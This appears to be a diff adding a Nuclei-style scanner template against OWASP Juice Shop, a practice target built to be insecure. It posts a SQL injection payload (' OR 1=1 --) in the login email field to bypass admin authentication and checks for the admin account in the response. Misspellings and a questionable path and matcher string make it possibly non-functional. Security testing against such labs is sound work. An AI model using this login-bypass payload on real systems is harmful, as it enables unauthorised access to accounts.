@@ -1,0 +1,21 @@
+id: owaps-juiceshop-admin-login
+info:
+  name: Login to OWASP dzus shop
+  author: destiny
+  severity: critical
+  description: just login
+  reference: owasp
+  tags: owaps-juiceshop
+
+requests:
+  - method: POST
+    path:
+      - "http://{{BaseURL}}#/login"
+    body: \{\"email\":\"' OR 1=1 --admin\",\"password\":\"5ecr37\"\}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - \"umail\":\"admin@juice-sh.op\"
